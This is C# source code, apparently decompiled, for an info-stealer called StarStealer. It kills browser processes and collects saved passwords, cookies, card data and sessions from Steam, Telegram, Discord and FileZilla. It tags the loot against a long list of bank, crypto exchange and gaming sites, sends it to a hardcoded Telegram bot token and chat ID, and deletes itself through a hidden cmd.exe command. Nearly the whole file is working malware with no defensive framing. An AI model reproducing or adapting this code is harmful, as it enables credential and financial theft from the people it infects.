using StarStealer.Entities;
using StarStealer.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using File = System.IO.File;
using User = StarStealer.Entities.User;

namespace StarStealer
{
	internal class Program
    {
        private static readonly long TELEGAID = 553078697L;
        public static List<Exception> Errors = new List<Exception>();
        private static ITelegramBotClient botClient;
        public static string raws = "Likest.ru vkmix bosslike vto.pe anti-captcha.com rucaptcha.com ilizium.com fastfreelikes likes.fm socgain.com vk.comtwitch gog.com battle.net wargaming ea.com socialclub pathofexile ubi.com humblebundle fonbet.com leonbets.com telegram.org sonyentertainmentnetwork.com eveonline warframe warface elderscrollsonline fanatical.com epicgames.com escapefrom steam seosprint adbtc investfond.org bitcointalk.org NHL bhf youhack lolzteam darkwebs ad-core.ru bosslike.ru ytmonster webmoney mpgh.net egb.com installcube.com installs.pro litevault.net paxful.com capdax.com wazirx.com okex.com bitfinex.com hitbtc.com kraken.com gateio.io bitstamp.net bittrex.com exmo yobit.net poloniex.com bitflyer.jp livecoin.net wex.nz mercatox.com localbitcoins.com localbitcoins.net luno.com therocktrading.com etherdelta.com anxpro.com c-cex.com gatecoin.com kiwi-coin.com jubi.com koineks.com ecoin.cc koinim.com litebit.eu lykke.com mangr.com localtrade.pro lbank.info leoxchange.com liqui.io kuna.io fybse.se freiexchange.com fybsg.com gatehub.net getbtc.org gemini.com gdax.com foxbit.com.br foxbit.exchange flowbtc.com.br exx.com exrates.me excambriorex.com ezbtc.ca fargobase.com fisco.co.uk glidera.io indacoin.com ethexindia.com indx.ru infinitycoin.exchange idex.su idex.market ice3x.com ice3x.co.za guldentrader.com exchange.guldentrader.com heatwallet.com hypex.nl negociecoins.com.br topbtc.com tidex.com tidebit.com tradesatoshi.com urdubit.com tuxexchange.com tdax.com coinmarketcap.com spacebtc.com surbitcoin.com surbtc.com usd-x.com xbtce.com yunbi.com zyado.com trade.z.com zaif.jp wavesplatform.com walltime.info vbtc.exchange vaultoro.com vircurex.com virtacoinworld.com vwlpro.com nlexch.com nevbit.com nocks.com novaexchange.com nxtplatform.org neraex.pro mixcoins.com mr-ripple.com dsx.uk nzbcx.com okcoin.com quadrigacx.com quoinex.com rightbtc.com ripplefox.com rippex.net openledger.info paymium.com paribu.com mercadobitcoin.com.br dcexe.com bitmex.com bitmaszyna.pl bitonic.nl bitpanda.com bitsblockchain.net bitmarket.net bitlish.com bitfex.trade bitexbook.com bitex.la bitflip.cc bitgrail.com bitkan.com bitinka.com bitholic.com bitsane.com changer.com bitshares.org btcmarkets.net braziliex.com btc-trade.com.ua btc-alpha.com bl3p.eu bitssa.com bitspark.io bitso.com bitstar.com ittylicious.com altcointrader.co.za arenabitcoin allcoin.com abucoins.com aidosmarket.com aex.com acx.com bancor.network bitbay.net indodax.com bitcointrade.com.br bitcointoyou.com bitbanktrade.jp bitbank.com big.one bcex.ru bitconnect.com bisq.network bit2c.co.il bit-z.com btcbear.com btcbox.in counterwallet.io freewallet.io indiesquare.me rarepepewallet.com coss.io coolcoin.com crex24.com cryptex.net coinut.com coinsbank.com coinsecure.in coinsquare.com coinsquare.io coinspot.io crypto-bridge.org dcex.com dabtc.com decentrex.com deribit.com dgtmarket.com cryptomkt.com cryptoderivatives.market cryptodao.com cryptomate.co.uk cryptox.pl cryptopia.co.nz coinroom.com coinrate.net chbtc.com chilebit.net coinbase.com burst-coin.org btcc.com btcc.net btctrade.im btcturk.com btcxindia.com coincheck.com coinmate.io coingi.com coinnest.co.kr coinrail.co.kr coinpit.io coingather.com coinfloor.co.uk coinegg.com coincorner.com coinexchange.io coinfalcon.com digatrade.com blockchain minergate myetherwallet.com my.dogechain.info coinome bitbns btc.top btcbank.com.ua coindelta.com depotwallet.com account.sonyentertainmentnetwork.com elderscrollsonline.com weblancer.net paypal.com cryptomining.farm leagueoflegends.com airbnb.ru booking.com unitpay.ru scotiabank.com bankofamerica.com chase.com airbnb.com hydra2web.com pornhubpremium.com binance.com bitclubnetwork.com quadrigacx.com hitbtc.com epicgames.com Cryptominingfarm.io Cryptomining.farm  miles-and-more.com navyfederal.org discover.com yobit OKEx HitBTC Huobi Livecoin KuCoin bitchanger bitx cryptopia okcoin bitmex bittrex poloniex binance exmo bitfinex coinmate bitmex huobi spacebtc Trade Satoshi CoinExchange tradeogre Bitstamp deribit blockchain ebay Exodus myetherwallet.com my.dogechain.info hydra2web.com hydraruzxpnew4f.onion 999dice steamcommunity.com";
        public static List<string> KeyWords;

        static Program()
        {
            List<string> list1 = new List<string>();
            list1.Add("Amazon");
            list1.Add("CitizensBank");
            list1.Add("Payeer");
            list1.Add("Skrill");
            list1.Add("WellsFargo");
            KeyWords = list1;
        }

        public static void Kill()
        {
            try
            {
                List<string> list1 = new List<string>();
                list1.Add("chrome");
                list1.Add("opera");
                list1.Add("yandex");
                list1.Add("browser");
                list1.Add("mozilla");
                list1.Add("firefox");
                list1.Add("kometa");
                list1.Add("orbitum");
                list1.Add("comodo");
                list1.Add("chromium");
                list1.Add("amigo");
                list1.Add("torch");
                List<string> list = list1;
                foreach (Process process in Process.GetProcesses())
                {
                    foreach (string str in list)
                    {
                        if (process.ProcessName.ToLower().Contains(str) && !process.ProcessName.ToLower().Contains("autoupdate"))
                        {
                            process.Kill();
                        }
                    }
                }
            }
            catch (Exception exception)
            {
                Errors.Add(exception);
            }
        }

        [STAThread]
        private static void Main(string[] args)
        {
            try
            {
                User user;
                string str;
                botClient = new TelegramBotClient("879228914:AAH0PEwN4FUC6XvZjCbykrBbd4U2QfQ5lOo", (System.Net.Http.HttpClient)null);
                if (!File.Exists(Path.Combine(Identifier.ApplicationData, "yes")))
                {
                    File.Create(Path.Combine(Identifier.ApplicationData, "yes"));
                    char[] separator = new char[] { ' ' };
                    string[] collection = raws.Split(separator, StringSplitOptions.RemoveEmptyEntries);
                    KeyWords.AddRange(collection);
                    user = new User();
                    Identifier.GetInfo(ref user);
                    Kill();
                    Stealer.Steal(ref user);
                    UserAgentGenerator.Generate(ref user);
                    Sorter.Sort(ref user);
                    str = string.Empty;
                    using (List<string>.Enumerator enumerator = KeyWords.GetEnumerator())
                    {
                        string current;
                        bool flag2;
                        bool flag3;
                        goto TR_0021;
                    TR_000B:
                        if (flag3 | flag2)
                        {
                            str = str + "\n";
                        }
                        goto TR_0021;
                    TR_0015:
                        foreach (Cookie cookie in user.Cookies)
                        {
                            try
                            {
                                if (!cookie.Host.ToLower().Contains(current.ToLower()))
                                {
                                    continue;
                                }
                                if (!flag2)
                                {
                                    continue;
                                }
                                str = str + "(C)";
                                flag3 = true;
                            }
                            catch
                            {
                                continue;
                            }
                            break;
                        }
                        goto TR_000B;
                    TR_0021:
                        while (true)
                        {
                            if (enumerator.MoveNext())
                            {
                                current = enumerator.Current;
                                flag2 = false;
                                flag3 = false;
                                try
                                {
                                    foreach (Password password in user.Passwords)
                                    {
                                        if (password.URL.ToLower().Contains(current.ToLower()))
                                        {
                                            str = str + current + " (P)";
                                            flag2 = true;
                                            break;
                                        }
                                    }
                                }
                                catch
                                {
                                }
                            }
                            else
                            {
                                goto TR_0008;
                            }
                            break;
                        }
                        goto TR_0015;
                    }
                }
                return;
            TR_0002:
                ProcessStartInfo info1 = new ProcessStartInfo();
                info1.Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Path.Combine(Directory.GetCurrentDirectory(), Process.GetCurrentProcess().ProcessName) + "\"";
                info1.WindowStyle = ProcessWindowStyle.Hidden;
                info1.CreateNoWindow = true;
                info1.FileName = "cmd.exe";
                Process.Start(info1);
                return;
            TR_0008:
                using (FileStream stream = new FileStream(Identifier.StealerZip, FileMode.Open))
                {
                    try
                    {
                        InputOnlineFile document = new InputOnlineFile(stream, Identifier.StealerZip);
                        string[] textArray1 = new string[0x1c];
                        textArray1[0] = "IP: *";
                        textArray1[1] = user.IP;
                        textArray1[2] = "*\nCountry: *";
                        textArray1[3] = user.Country;
                        textArray1[4] = " (";
                        textArray1[5] = user.CountryCode;
                        textArray1[6] = ")*\nCity: *";
                        textArray1[7] = user.City;
                        textArray1[8] = "*\n————————————————\n";
                        textArray1[9] = $"Passwords: *{user.PasswordsNumber}*";
                        textArray1[10] = $"Cookies: *{user.CookiesNumber}*";
                        textArray1[11] = $"Forms: *{user.Forms}*";
                        textArray1[12] = $"Cards: *{user.CardsNumber}*";
                        textArray1[13] = "Photo: *";
                        textArray1[14] = user.WithPhoto ? " +" : "-";
                        string[] local3 = textArray1;
                        local3[15] = "*\nBitcoins: *";
                        local3[0x10] = user.Bitcoin ? " +" : "-";
                        string[] local4 = local3;
                        local4[0x11] = "*\nSessions:*";
                        local4[0x12] = user.FileZilla ? " FileZilla" : "";
                        string[] local5 = local4;
                        local5[0x13] = "**";
                        local5[20] = user.Steam ? " Steam" : "";
                        string[] local6 = local5;
                        local6[0x15] = "**";
                        local6[0x16] = user.Telegram ? " Telegram" : "";
                        string[] local7 = local6;
                        local7[0x17] = "**";
                        local7[0x18] = user.Discord ? " Discord" : "";
                        string[] local8 = local7;
                        local8[0x19] = "*\n————————————————\n*";
                        local8[0x1a] = str;
                        local8[0x1b] = "*";
                        CancellationToken cancellationToken = new CancellationToken();
                        botClient.SendDocumentAsync(TELEGAID, document, string.Concat(local8), ParseMode.Markdown, false, 0, null, cancellationToken, null).Wait();
                    }
                    catch
                    {
                    }
                }
                goto TR_0002;
            }
            catch (Exception exception)
            {
                Errors.Add(exception);
            }
        }
    }
}

